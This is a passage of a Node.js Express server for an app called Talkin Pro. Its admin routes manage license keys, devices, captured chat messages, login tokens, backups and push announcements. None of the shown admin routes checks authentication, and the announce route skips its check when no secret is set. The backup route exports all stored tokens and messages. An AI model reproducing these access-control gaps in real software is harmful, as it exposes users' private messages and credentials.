app.post('/admin/api/keys/:key/:action', (req, res) => {
  const { key, action } = req.params;
  let result;
  if (action === 'enable') result = keysEngine.enableKey(key);
  else if (action === 'disable') result = keysEngine.disableKey(key);
  else if (action === 'unblock') result = keysEngine.unblockKey(key);
  else if (action === 'reset') result = keysEngine.resetKey(key);
  else if (action === 'delete') {
    const ok = keysEngine.removeKey(key);
    return jsonOk(res, { deleted: ok });
  } else {
    return jsonError(res, 400, 'invalid_action', 'Use: enable, disable, unblock, reset, delete');
  }
  if (!result) return jsonError(res, 404, 'not_found', 'Key not found');
  if (result.error) return jsonError(res, 400, 'error', result.error);
  if (action === 'reset') {
    jsonOk(res, { old_key: result.old, new_key: result.new, record: result.record });
  } else {
    jsonOk(res, { key: result });
  }
});

// Devices list
app.get('/admin/api/devices', (_req, res) => {
  jsonOk(res, { devices: store.listDevices() });
});

// Activity log
app.get('/admin/api/activity', (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 200, 5000);
  const deviceId = req.query.device_id || null;
  jsonOk(res, { activity: store.listActivity(limit, deviceId) });
});

// Messages (captured chat)
app.get('/admin/api/messages', (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 200, 5000);
  const deviceId = req.query.device_id || null;
  jsonOk(res, { messages: store.listMessages(limit, deviceId) });
});

// Login tokens
app.get('/admin/api/tokens', (_req, res) => {
  jsonOk(res, { tokens: store.allLoginTokens() });
});

// Backup (download full DB)
app.get('/admin/api/backup', (_req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', 'attachment; filename="talkinpro-backup.json"');
  res.send(JSON.stringify(store.exportAll(), null, 2));
});

// Restore
app.post('/admin/api/restore', (req, res) => {
  const db = req.body;
  if (!db || !db.keys || !db.devices) {
    jsonError(res, 400, 'invalid_backup', 'Backup must contain keys and devices');
    return;
  }
  store.importAll(db);
  store.logActivity({ type: 'admin_restore', detail: 'Database restored from backup' });
  jsonOk(res, { restored: true });
});

// Stats summary
app.get('/admin/api/stats', (_req, res) => {
  const ks = store.listKeys();
  const stats = {
    total_keys: ks.length,
    active: ks.filter(k => k.status === 'active').length,
    disabled: ks.filter(k => k.status === 'disabled').length,
    blocked: ks.filter(k => k.status === 'blocked').length,
    expired: ks.filter(k => k.status === 'expired').length,
    devices: store.listDevices().length,
    messages: store.listMessages(99999).length,
    activity: store.listActivity(99999).length,
  };
  jsonOk(res, stats);
});

// Debug: GitHub sync status (admin only)
app.get('/admin/api/sync-status', async (_req, res) => {
  const ghStore = require('./github-store');
  const status = ghStore.getStatus();
  status.server_keys = store.listKeys().length;
  jsonOk(res, status);
});

// Debug: Force sync to GitHub now (admin only)
app.post('/admin/api/sync-now', async (_req, res) => {
  const result = await store.forceSyncToGitHub();
  jsonOk(res, result);
});

app.post('/admin/announce', async (req, res) => {
  const adminSecret = process.env.ADMIN_SECRET;
  if (adminSecret && req.headers['x-admin-secret'] !== adminSecret) {
    jsonError(res, 403, 'forbidden', 'Invalid admin secret.');
    return;
  }
  const { title, body } = req.body;
  if (!title) {
    jsonError(res, 400, 'title_required', 'title is required.');
    return;
  }
  let sent = 0;
  for (const device of devices.values()) {
    if (device.pushToken) {
      try {
        await sendPushNotification(device.pushToken, title, body || '');
        sent++;
      } catch (e) {
        console.error('Push failed for device:', device.deviceId, e.message);
      }
    }
  }
  jsonOk(res, { sent, total_devices: devices.size });
});

// ════════════════════════════════════════════════════════════
// ERROR HANDLERS
// ════════════════════════════════════════════════════════════

app.use((_req, res) => {
  jsonError(res, 404, 'not_found', 'Endpoint not found.');
});

app.use((err, _req, res, _next) => {
  console.error('Unhandled error:', err);
  jsonError(res, 500, 'internal_error', err.message || 'Internal server error.');
});

// ════════════════════════════════════════════════════════════
// HELPERS
// ════════════════════════════════════════════════════════════

/**
 * Compare semantic version strings (e.g. "1.2.3" vs "1.10.0").
 * Returns: 1 if a > b, 0 if a == b, -1 if a < b
 */
function compareVersions(a, b) {
  const pa = String(a).split('.').map((n) => parseInt(n, 10) || 0);
  const pb = String(b).split('.').map((n) => parseInt(n, 10) || 0);
  const len = Math.max(pa.length, pb.length);
  for (let i = 0; i < len; i++) {
    const na = pa[i] || 0;
    const nb = pb[i] || 0;
    if (na > nb) return 1;
    if (na < nb) return -1;
  }
  return 0;
}

/**
 * Generate a stable device ID from request metadata.
 */
function generateDeviceId(req) {
  const fingerprint = [
    req.headers['user-agent'] || '',
    req.headers['x-device-fingerprint'] || '',
    req.ip || '',
  ].join('|');
  return crypto
    .createHash('sha256')
    .update(fingerprint)
    .digest('hex')
    .substring(0, 32);
}

// ════════════════════════════════════════════════════════════
// START
// ════════════════════════════════════════════════════════════

async function start() {
  // Initialize persistent storage from GitHub backup (if configured)
  try {
    await store.init();
  } catch (e) {
    console.warn('⚠️  Store init error:', e.message);
  }

  // Initialize Firebase Admin (if configured)
  try {
    initFirebase();
    console.log('✅ Firebase Admin initialized');
  } catch (e) {
    console.warn('⚠️  Firebase not initialized:', e.message);
    console.warn('   (Push notifications will not work until Firebase is configured.)');
  }

  app.listen(config.port, () => {
    console.log('\n╔══════════════════════════════════════╗');
    console.log('║   Talkin Pro Server — Running        ║');
    console.log('╚══════════════════════════════════════╝');
    console.log(`  Port:              ${config.port}`);
    console.log(`  Latest version:    ${config.app.latestVersion}`);
    console.log(`  Min version:       ${config.app.minVersion}`);
    console.log(`  Free entitlement:  ${config.freeEntitlement}`);
    console.log(`  Agora App ID:      ${config.agora.appId ? '✓ set' : '✗ missing'}`);
    console.log(`  Signing secret:    ${config.signingSecret ? '✓ set' : '✗ missing'}`);
    console.log(`  Entitlement key:   ${config.entitlementPublicKeyHex ? '✓ set' : '✗ missing'}`);
    console.log(`  Tencent msg key:   ${config.tencent.msgKey ? '✓ set' : '✗ missing'}`);
    console.log('');
  });
}

start();
